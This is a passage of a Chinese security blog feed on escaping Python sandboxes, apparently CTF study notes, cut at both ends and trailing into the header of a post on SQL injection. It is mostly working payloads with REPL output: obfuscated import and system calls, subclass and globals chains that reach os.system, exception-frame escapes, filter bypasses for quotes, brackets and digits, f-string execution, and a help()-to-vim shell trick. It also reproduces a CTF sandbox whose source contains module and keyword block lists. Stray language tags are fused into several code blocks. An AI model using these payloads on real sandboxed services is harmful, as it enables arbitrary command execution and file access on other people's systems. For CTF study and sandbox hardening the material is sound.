's'__import__(a+b).system('ls')</code></pre><ol><li>还可以利用 <code>eval</code> 或者 <code>exec</code></li></ol><pre class="language-none"><code class="language-none">&gt;&gt;&gt; eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])macr0phag30&gt;&gt;&gt; exec(')"imaohw"(metsys.so ;so tropmi'[::-1])macr0phag3</code></pre><p>eval、exec 都是相当危险的函数，exec 比 eval 还要危险</p><p>对字符串的处理可以有：逆序、拼接、base64、hex、rot13…等等，</p><pre class="language-none"><code class="language-none">['__builtins__'] ['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'][u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['X19idWlsdGluc19f'.decode('base64')]['__buil'+'tins__']['__buil''tins__']['__buil'.__add__('tins__')]["_builtins_".join("__")]['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]...</code></pre><h2 id="builtins、builtin-与-builtins"><a href="#builtins、builtin-与-builtins" class="headerlink" title="builtins、builtin__与__builtins"></a><strong>builtins、<strong>builtin__与__builtins</strong></strong></h2><p>在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块</p><p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; '__import__' in dir(__builtins__)True&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')macr0phag30&gt;&gt;&gt; 'eval' in dir(__builtins__)True&gt;&gt;&gt; 'execfile' in dir(__builtins__)True</code></pre><p>这里稍微解释下 <code>x.__dict__</code> ，它是 x 内部所有属性名和属性值组成的字典，有以下特点：</p><ol><li>内置的数据类型没有 <strong>dict</strong> 属性</li><li>每个类有自己的 <strong>dict</strong> 属性，就算存着继承关系，父类的 <strong>dict</strong> 并不会影响子类的 <strong>dict</strong></li><li>对象也有自己的 <strong>dict</strong> 属性，包含 <code>self.xxx</code> 这种实例属性</li></ol><p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p><p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明 <code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过</p><h2 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a><strong>通过继承关系逃逸</strong></h2><p>在 Python 中提到继承就不得不提 <code>mro</code>，<code>mro</code>就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 <code>object</code>，当然也是使用的 C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，<code>.__mro__</code> 或 <code>.mro()</code>，是个元组，记录了继承关系：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__(&lt;class 'str'&gt;, &lt;class 'object'&gt;)CEYLON</code></pre><p> 类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>''</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; class test:...  pass...&gt;&gt;&gt; test.__bases__()&gt;&gt;&gt; class test(object):...  pass...&gt;&gt;&gt; test.__bases__(&lt;type 'object'&gt;,)PYTHON-REPL</code></pre><p>那么知道这个有什么用呢？</p><p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os。例如，<code>site</code> 这个库就有 <code>os</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import site&gt;&gt;&gt; site.os&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py'&gt;MOONSCRIPT</code></pre><p>怎么理解这个 <strong>globals</strong> 呢？它是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 <code>builtin_function_or_method</code> 或者是 <code>wrapper_descriptor</code> 、<code>method-wrapper</code> 类型的函数，例如 <code>range</code>、<code>range.__init__</code>、<code>''.split</code> 等等。</p><p>那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import site&gt;&gt;&gt; osTraceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;NameError: name 'os' is not defined&gt;&gt;&gt; os = reload(site.os)&gt;&gt;&gt; os.system('whoami')macr0phag30PYTHON-REPL</code></pre><p>还有，既然所有的类都继承的<code>object</code>，那么我们先用<code>__subclasses__</code>看看它的子类，以 2.x 为例：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i...(0, &lt;type 'type'&gt;)(1, &lt;type 'weakref'&gt;)(2, &lt;type 'weakcallableproxy'&gt;)(3, &lt;type 'weakproxy'&gt;)(4, &lt;type 'int'&gt;)(5, &lt;type 'basestring'&gt;)(6, &lt;type 'bytearray'&gt;)(7, &lt;type 'list'&gt;)(8, &lt;type 'NoneType'&gt;)(9, &lt;type 'NotImplementedType'&gt;)(10, &lt;type 'traceback'&gt;)(11, &lt;type 'super'&gt;)(12, &lt;type 'xrange'&gt;)(13, &lt;type 'dict'&gt;)(14, &lt;type 'set'&gt;)(15, &lt;type 'slice'&gt;)(16, &lt;type 'staticmethod'&gt;)(17, &lt;type 'complex'&gt;)(18, &lt;type 'float'&gt;)(19, &lt;type 'buffer'&gt;)(20, &lt;type 'long'&gt;)(21, &lt;type 'frozenset'&gt;)(22, &lt;type 'property'&gt;)(23, &lt;type 'memoryview'&gt;)(24, &lt;type 'tuple'&gt;)(25, &lt;type 'enumerate'&gt;)(26, &lt;type 'reversed'&gt;)(27, &lt;type 'code'&gt;)(28, &lt;type 'frame'&gt;)(29, &lt;type 'builtin_function_or_method'&gt;)(30, &lt;type 'instancemethod'&gt;)(31, &lt;type 'function'&gt;)(32, &lt;type 'classobj'&gt;)(33, &lt;type 'dictproxy'&gt;)(34, &lt;type 'generator'&gt;)(35, &lt;type 'getset_descriptor'&gt;)(36, &lt;type 'wrapper_descriptor'&gt;)(37, &lt;type 'instance'&gt;)(38, &lt;type 'ellipsis'&gt;)(39, &lt;type 'member_descriptor'&gt;)(40, &lt;type 'file'&gt;)(41, &lt;type 'PyCapsule'&gt;)(42, &lt;type 'cell'&gt;)(43, &lt;type 'callable-iterator'&gt;)(44, &lt;type 'iterator'&gt;)(45, &lt;type 'sys.long_info'&gt;)(46, &lt;type 'sys.float_info'&gt;)(47, &lt;type 'EncodingMap'&gt;)(48, &lt;type 'fieldnameiterator'&gt;)(49, &lt;type 'formatteriterator'&gt;)(50, &lt;type 'sys.version_info'&gt;)(51, &lt;type 'sys.flags'&gt;)(52, &lt;type 'exceptions.BaseException'&gt;)(53, &lt;type 'module'&gt;)(54, &lt;type 'imp.NullImporter'&gt;)(55, &lt;type 'zipimport.zipimporter'&gt;)(56, &lt;type 'posix.stat_result'&gt;)(57, &lt;type 'posix.statvfs_result'&gt;)(58, &lt;class 'warnings.WarningMessage'&gt;)(59, &lt;class 'warnings.catch_warnings'&gt;)(60, &lt;class '_weakrefset._IterationGuard'&gt;)(61, &lt;class '_weakrefset.WeakSet'&gt;)(62, &lt;class '_abcoll.Hashable'&gt;)(63, &lt;type 'classmethod'&gt;)(64, &lt;class '_abcoll.Iterable'&gt;)(65, &lt;class '_abcoll.Sized'&gt;)(66, &lt;class '_abcoll.Container'&gt;)(67, &lt;class '_abcoll.Callable'&gt;)(68, &lt;type 'dict_keys'&gt;)(69, &lt;type 'dict_items'&gt;)(70, &lt;type 'dict_values'&gt;)(71, &lt;class 'site._Printer'&gt;)(72, &lt;class 'site._Helper'&gt;)(73, &lt;type '_sre.SRE_Pattern'&gt;)(74, &lt;type '_sre.SRE_Match'&gt;)(75, &lt;type '_sre.SRE_Scanner'&gt;)(76, &lt;class 'site.Quitter'&gt;)(77, &lt;class 'codecs.IncrementalEncoder'&gt;)(78, &lt;class 'codecs.IncrementalDecoder'&gt;)PYTHON</code></pre><p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例（py3.x 中已经移除了这里 <strong>globals</strong> 的 <code>os</code>）：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i._Printer__setup.__globals__['os'] for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_Printer"]&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;PROLOG</code></pre><p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p><p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import warnings&gt;&gt;&gt; &gt;&gt;&gt; warnings.osTraceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;AttributeError: 'module' object has no attribute 'os'&gt;&gt;&gt; &gt;&gt;&gt; warnings.linecache&lt;module 'linecache' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc'&gt;&gt;&gt;&gt;&gt;&gt;&gt; warnings.linecache.os&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;PYTHON</code></pre><p>在继承链中就可以这样（py3.x 中已经移除了这里 <strong>globals</strong> 的 <code>linecache</code>）：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')macr0phag30&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "catch_warnings"]PROLOG</code></pre><p> 顺便说一下，<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p><pre class="language-none"><code class="language-none"> def __init__(self, record=False, module=None):... self._module = sys.modules['warnings'] if module is None else module...OXYGENE</code></pre><p>所以通过<code>_module</code>也可以构造 payload（py3.x 中已经移除了 <code>catch_warnings</code> 的 <code>linecache</code>）：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.linecache.os.system('whoami')macr0phag30STYLUS</code></pre><p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p><p>同样，py3.x 中有<code>&lt;class 'os._wrap_close'&gt;</code>，利用方式可以为：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')macr0phag30&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：&gt;&gt;&gt; [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami')PROLOG</code></pre><p>当然这样也是可以的（3.x）：</p><pre class="language-none"><code class="language-none">set.mro()[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')PYTHON</code></pre><p>顺便提一下，<code>object</code> 本来就是可以使用的，如果没过滤的话，payload 可以再简化为：</p><pre class="language-none"><code class="language-none">object.__subclasses__()[133].__init__.__globals__['system']('whoami')PYTHON</code></pre><p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p><pre class="language-none"><code class="language-none">"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval, '1+1')SQF</code></pre><p> 或者简单一点：</p><pre class="language-none"><code class="language-none">[].pop.__class__.__call__(eval, '1+1')STYLUS</code></pre><p>上面这些 payload 大多数是直接 index 了，但是直接用 index 不太健壮，可以都换成列表推导式，用 <strong>name</strong> 来获取想要的 class，上面也举了好几个例子了，这里就不多说啦。</p><p>最后再补充几个。</p><p>可以这样利用：</p><pre class="language-none"><code class="language-none">class test(dict): def __init__(self): print(super(test, self).keys.__class__.__call__(eval, '1+1')) # 如果是 3.x 的话可以简写为： # super().keys.__class__.__call__(eval, '1+1'))test()SCSS</code></pre><p>还可以利用异常逃逸：</p><pre class="language-none"><code class="language-none">hack = lambda : [0][1]try: hack()except Exception as e: e.__traceback__.tb_next.tb_frame.f_globals['__builtins__']['__import__']('os').system('whoami')PYTHON</code></pre><p>还可以利用 <code>format</code>：</p><ol><li><code>"{0.__class__.__base__}".format([])</code></li><li><code>"{x.__class__.__base__}".format(x=[])</code></li><li><code>"{.__class__.__base__}".format([])</code></li><li><code>("{0.__class_"+"_.__base__}").format([])</code></li></ol><p>（这里顺手记录下，对于字典键是整数型的比如 <code>{"1":2}</code>，format 是无法拿到值的 :)，这样会报错：<code>''' {0['1']} '''.format({"1":2})</code>，<code>'1'</code> 引号去掉的话又会报没有这个键，这个特性可以见<a href="https://docs.python.org/3/library/string.html#format-string-syntax">文档</a>）</p><p>上面的这些利用方式总结起来就是通过 <code>.mro()</code>、<code>__class__</code>、<code>type(...)</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__base__</code>、<code>__bases__</code> 等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p><p>最后，其实沙箱逃逸，对于不同的第三方库可能会存在一些特殊的利用方式，比如 <code>jinja2</code>，这类属于 <code>SSTI</code> 漏洞，可以看这篇博客：<a href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/">传送门🚪</a>，这里就不多说了。</p><p>其实 SSTI 也会用到这里的很多技巧，两者知识面相互交叠。</p><h1 id="文件读写沙箱逃逸"><a href="#文件读写沙箱逃逸" class="headerlink" title="文件读写沙箱逃逸"></a><strong>文件读写</strong>沙箱逃逸</h1><p>2.x 有个内建的 <code>file</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; file('key').read()'Macr0phag3\n'&gt;&gt;&gt; file('key', 'w').write('Macr0phag3')&gt;&gt;&gt; file('key').read()'Macr0phag3'DELPHI</code></pre><p>还有个 <code>open</code>，2.x 与 3.x 通用。</p><p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)。</p><p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来： math.py：</p><pre class="language-none"><code class="language-none">import osprint(os.system('whoami'))MOONSCRIPT</code></pre><p> 调用</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; import mathmacr0phag30PYTHON-REPL</code></pre><p> 这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; 're' in sys.modulesTrue&gt;&gt;&gt; 'math' in sys.modulesFalse&gt;&gt;&gt;PYTHON-REPL</code></pre><p> 当然在<code>import re</code> 之前<code>del sys.modules['re']</code>也不是不可以…</p><p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p><p>读文件暂时没什么发现特别的地方。</p><p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; __builtins__.open('key').read()'Macr0phag3\n'LIVECODESERVER</code></pre><p> 或者</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]('key').read()'Macr0phag3'GCODE</code></pre><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a><strong>敏感信息泄露</strong></h1><p>这个也算只能读吧。</p><ol><li><code>dir()</code></li><li><code>__import__("__main__").x</code>，其中 <strong>main</strong> 还会泄露脚本的绝对路径：<code>&lt;module '__main__' from 'xxx.py'&gt;</code></li><li><code>__file__</code>，文件绝对路径</li><li><code>x.__dict__</code></li><li><code>locals()</code></li><li><code>globals()</code></li><li><code>vars()</code></li><li><code>sys._getframe(0).f_code.co_varnames</code></li><li><code>sys._getframe(0).f_locals</code></li><li><code>inspect.x</code>，inspect 有很多方法可以获取信息，比如获取源码可以用 <code>inspect.getsource</code>，还有其他很多的功能</li><li>…</li></ol><p>这有一篇不错的文章，推荐阅读：</p><p><a href="https://www.cnblogs.com/dechinphy/p/modify-locals.html">https://www.cnblogs.com/dechinphy/p/modify-locals.html</a></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h1><p>这些行为不像是 oj 会做得出来的，ctf 倒是有可能出现。</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤 [ ]"></a><strong>过滤 [ ]</strong></h3><p>应对的方式就是将<code>[]</code>的功能用<code>pop</code>、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get('linecache').os.popen('whoami').read()'macr0phag3\n'STYLUS</code></pre><p>当然，dict 也是可以 pop 的：<code>{"a": 1}.pop("a")</code></p><p>当然也可以用 <code>next(iter())</code> 替代，或许可以加上 <code>max</code> 之类的玩意。</p><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a><strong>过滤引号</strong></h3><blockquote><p>chr</p></blockquote><p>最简单就是用 <code>chr</code> 啦</p><pre class="language-none"><code class="language-none">os.system( chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))SCSS</code></pre><blockquote><p>扣字符</p></blockquote><p>利用 <code>str</code> 和 <code>[]</code>，挨个把字符拼接出来</p><pre class="language-none"><code class="language-none">os.system( str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(()a)[10]+str(().__class__.__new__)[3])SCSS</code></pre><p> 当然 <code>[]</code> 如果被过滤了也可以 bypass，前面说过了。</p><p>如果 str 被过滤了怎么办呢？<code>type('')()</code>、<code>format()</code> 即可。同理，<code>int</code>、<code>list</code> 都可以用 <code>type</code> 构造出来。</p><blockquote><p>格式化字符串</p></blockquote><p>那过滤了引号，格式化字符串还能用吗？</p><p><code>(chr(37)+str({}.__class__)[1])%100 == 'd'</code></p><p>又起飞了…</p><blockquote><p>dict() 拿键它不香吗？</p><pre class="language-none"><code class="language-none">'whoami' ==list(dict(whoami=1))[0] ==str(dict(whoami=1))[2:8] ==aPYTHON</code></pre></blockquote><h3 id="限制数字"><a href="#限制数字" class="headerlink" title="限制数字"></a><strong>限制数字</strong></h3><p>上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：</p><ol><li>0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code></li><li>1：<code>int(bool([""]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></li><li>获取稍微大的数字：<code>len(str({}.keys))</code>，不过需要慢慢找长度符合的字符串</li><li>1.0：<code>float(True)</code></li><li>-1：<code>~0</code></li><li>…</li></ol><p>其实有了 <code>0</code> 就可以了，要啥整数直接做运算即可：</p><pre class="language-none"><code class="language-none">0 ** 0 == 11 + 1 == 22 + 1 == 32 ** 2 == 4...PYTHON</code></pre><p>任意浮点数稍微麻烦点，需要想办法运算，但是一定可以搞出来，除非是 π 这种玩意…</p><h3 id="限制空格"><a href="#限制空格" class="headerlink" title="限制空格"></a><strong>限制空格</strong></h3><p>空格通常来说可以通过 <code>()</code>、<code>[]</code> 替换掉。例如：</p><p><code>[i for i in range(10) if i == 5]</code> 可以替换为 <code>[[i][0]for(i)in(range(10))if(i)==5]</code></p><h3 id="限制运算符"><a href="#限制运算符" class="headerlink" title="限制运算符"></a><strong>限制运算符</strong></h3><blockquote><p><code>&gt; &lt; ! - +</code> 这几个比较简单就不说了。</p></blockquote><p><code>==</code> 可以用 <code>in</code> 来替换。</p><p>替换 <code>or</code> 的测试代码</p><pre class="language-none"><code class="language-none">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] or i[2]==i[3] print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans) print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans) print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)PY</code></pre><p> 上面这几个表达式都可以替换掉 <code>or</code></p><p>替换 <code>and</code> 的测试代码</p><pre class="language-none"><code class="language-none">for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] and i[2]==i[3] print(bool(eval(f'{i[0]==i[1]} &amp; {i[2]==i[3]}')) == ans) print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)PY</code></pre><p> 上面这几个表达式都可以替换掉 <code>and</code></p><h3 id="限制"><a href="#限制" class="headerlink" title="限制 ( )"></a><strong>限制 ( )</strong></h3><p>这种情况下通常需要能够支持 exec 执行代码。因为有两种姿势：</p><ul><li>利用装饰器 <code>@</code></li><li>利用魔术方法，例如 <code>enum.EnumMeta.__getitem__</code>，</li></ul><p>利用这两种姿势，我在《OrangeKiller CTF 第 2 期》中出了 2 道题目，题解篇写的很详细，移步去看吧：<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">传送门</a></p><h3 id="利用新特性"><a href="#利用新特性" class="headerlink" title="利用新特性"></a><strong>利用新特性</strong></h3><p>PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features">传送门🚪</a>，食用方式：<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings">传送门🚪</a>。所以我们就有了一种船新的利用方式：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; f'{__import__("os").system("whoami")}'macr0phag3'0'PYTHON</code></pre><p> 关注每次版本增加的新特性，或许能淘到点宝贝。</p><h3 id="利用反序列化攻击"><a href="#利用反序列化攻击" class="headerlink" title="利用反序列化攻击"></a><strong>利用反</strong>序列化<strong>攻击</strong></h3><p>反序列化攻击也是能用来逃逸，但是关于反序列化攻击的安全问题还挺多的，见这篇文章，见：<a href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">传送门🚪</a></p><h2 id="🌰"><a href="#🌰" class="headerlink" title="🌰"></a><strong>🌰</strong></h2><p>这个例子来自<code>iscc 2016</code>的<code>Pwn300 pycalc</code>，相当有趣：</p><pre class="language-none"><code class="language-none">#!/usr/bin/env python2# -*- coding:utf-8 -*-def banner(): print "=============================================" print " Simple calculator implemented by python " print "=============================================" returndef getexp(): return raw_input("&gt;&gt;&gt; ")def _hook_import_(name, *args, **kwargs): module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi', 'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache', 'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip', 'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil', 'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools', 'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new', 'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib', 'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile', 'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer', 'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer', 'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib', 'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2', 'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport'] for forbid in module_blacklist: if name == forbid: # don't let user import these modules raise RuntimeError('No you can\' import {0}!!!'.format(forbid)) # normal modules can be imported return __import__(name, *args, **kwargs)def sandbox_filter(command): blacklist = ['exec', 'sh', '__getitem__', '__setitem__', '=', 'open', 'read', 'sys', ';', 'os'] for forbid in blacklist: if forbid in command: return 0 return 1def sandbox_exec(command): # sandbox user input result = 0 __sandboxed_builtins__ = dict(__builtins__.__dict__) __sandboxed_builtins__['__import__'] = _hook_import_ # hook import del __sandboxed_builtins__['open'] _global = { '__builtins__': __sandboxed_builtins__ } if sandbox_filter(command) == 0: print 'Malicious user input detected!!!' exit(0) command = 'result = ' + command try: exec command in _global # do calculate in a sandboxed environment except Exception, e: print e return 0 result = _global['result'] # extract the result return resultbanner()while 1: command = getexp() print sandbox_exec(command)PYTHON</code></pre><p><code>exec command in _global</code> 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code>，这里不赘述了，感兴趣可以看这篇文章：<a href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html">传送门🚪</a>。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__restricted attribute&gt;&gt;&gt; getattr(getattr(__import__('types'), 'FileType')('key'), 're''ad')()file() constructor not accessible in restricted modeDELPHI</code></pre><p> 不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types 库，来执行任意命令：</p><pre class="language-none"><code class="language-none">&gt;&gt;&gt; getattr(__import__('types').__builtins__['__tropmi__'[::-1]]('so'[::-1]), 'mets' 'ys'[::-1])('whoami')macr0phag3LISP</code></pre><h3 id="极端限制"><a href="#极端限制" class="headerlink" title="极端限制"></a><strong>极端限制</strong></h3><p>这种限制一般是组合形式出现，而且通常只会出现在 CTF 中。</p><blockquote><p>限制输入字符的集合的大小</p></blockquote><p>思路就是先确定不得不用到的字符，再看这些字符能够拼出哪些函数或者常量。</p><p>在《OrangeKiller CTF 第 2 期》中出了 3 道题目与此相关，移步去看吧：<a href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">传送门</a></p><blockquote><p>限制不能使用 <code>[a-zA-Z]</code> 的字符</p></blockquote><p>我在 <a href="https://www.tr0y.wang/2020/08/18/IDN/#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF">《从一个绕过长度限制的 XSS 中，我们能学到什么？》</a> 中提到过，Python3 支持了 Unicode 变量名且解释器在做代码解析的时候，会对变量名进行规范化，算法是 <code>NFKC</code>。</p><p>所以在这种情况下可以用这种姿势：</p><pre class="language-none"><code class="language-none">eval == ᵉvalPYTHON</code></pre><blockquote><p>socket + 严格的输入限制</p></blockquote><p>可以看看是否漏掉了 <code>help</code>，漏掉的话，先通过 <code>help()</code> 调起 vi/vim，然后用 <code>!</code> 指令即可 getshell :)</p><p>参考：<a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8">https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> python安全 </tag>
            
            <tag> 进阶学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入漏洞总结</title>
      <link href="/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/"/>
      <url>/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/</url>
      
